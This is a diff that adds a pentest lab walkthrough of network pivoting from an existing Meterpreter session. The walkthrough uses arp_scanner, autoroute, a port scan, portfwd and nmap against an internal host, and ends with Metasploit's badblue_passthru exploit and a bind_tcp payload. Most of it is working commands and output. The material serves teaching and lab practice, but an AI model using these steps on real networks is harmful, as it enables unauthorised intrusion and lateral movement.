@@ -241,3 +241,120 @@ dir K:
                0 Dir(s)  10,951,335,936 bytes free
 
 ```
+
+## Autoroute Example 2 with Arpscanner
+
+We have a Meterpreter shell on a target and use _Arpscanner_ to locate additional machines on the network.
+
+First we locate other networks using _ipconfig_
+
+```bash
+meterpreter > ipconfig
+
+
+Interface 17
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
+Hardware MAC : 08:00:27:2c:70:e4
+MTU          : 1500
+IPv4 Address : 10.100.40.100
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::1020:455b:7b7e:f602
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+```
+
+Now we can use _arpscanner_ to look for live hosts on the 10.100.40.0/24 network.
+
+```bash
+meterpreter > run arp_scanner -r 10.100.40.0/24
+[*] ARP Scanning 10.100.40.0/24
+[*] IP: 10.100.40.100 MAC 08:00:27:2c:70:e4
+[*] IP: 10.100.40.107 MAC 08:00:27:46:4d:f6
+
+```
+
+Now we can add a route to the session to launch further attacks on the newly discovered host 10.100.40.107
+
+```bash
+meterpreter > run autoroute -s 10.100.40.0/24
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 10.100.40.0/255.255.255.0...
+[+] Added route to 10.100.40.0/255.255.255.0 via 172.16.5.10
+[*] Use the -p option to list all active routes
+
+```
+
+We have added the route and can now use the auxiliary port scanner module.
+
+This shows several open ports, including port 80, on the target machine.
+
+```bash
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/script/web_delivery) > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.100.40.107
+RHOSTS => 10.100.40.107
+msf6 auxiliary(scanner/portscan/tcp) > exploit
+
+[+] 10.100.40.107:        - 10.100.40.107:80 - TCP OPEN
+[+] 10.100.40.107:        - 10.100.40.107:139 - TCP OPEN
+[+] 10.100.40.107:        - 10.100.40.107:135 - TCP OPEN
+
+```
+
+We can now use _portfwd_ to forward the remote port 80 to the local port 1234.
+
+```bash
+msf6 auxiliary(scanner/portscan/tcp) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > portfwd add -l 1234 -p 80 -r 10.100.40.107
+[*] Local TCP relay created: :1234 <-> 10.100.40.107:80
+meterpreter > portfwd list
+
+Active Port Forwards
+====================
+
+   Index  Local             Remote        Direction
+   -----  -----             ------        ---------
+   1      10.100.40.107:80  0.0.0.0:1234  Forward
+
+1 total active port forwards.
+```
+
+We have forwarded the remote port 80 to local port 1234.
+
+Now we can scan this remote port 80 as 1234 using nmap.
+
+```bash
+┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
+└─$ nmap -sC -sV -p 1234 localhost
+
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000084s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE VERSION
+1234/tcp open  http    BadBlue httpd 2.7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+```
+
+Badblue exploit would allow access using Metasploit module _exploit/windows/http/badblue_passthru_
+
+Note: when an endpoint is not directly accessible (remote network being accessed via pivoting) we cannot use _reverse_tcp_ payload.
+
+Instead, we have to use the _bind_tcp_ payload
+
+```bash
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.100.40.107
+set PAYLOAD windows/meterpreter/bind_tcp
+exploit
+getuid
+sysinfo
+```
